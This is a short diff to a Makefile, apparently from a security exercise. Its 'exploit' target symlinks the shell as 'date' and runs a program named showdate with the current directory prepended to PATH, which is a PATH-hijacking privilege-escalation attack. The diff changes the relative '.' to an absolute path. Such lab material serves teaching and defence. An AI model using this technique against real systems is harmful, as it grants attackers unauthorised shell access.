@@ -2,7 +2,7 @@ all: set_permissions
 
 exploit:
 	ln -fs $(shell which sh) date
-	PATH=.:$(PATH) ./showdate
+	PATH=$(shell pwd):$(PATH) ./showdate
 
 clean:
 	rm -f date
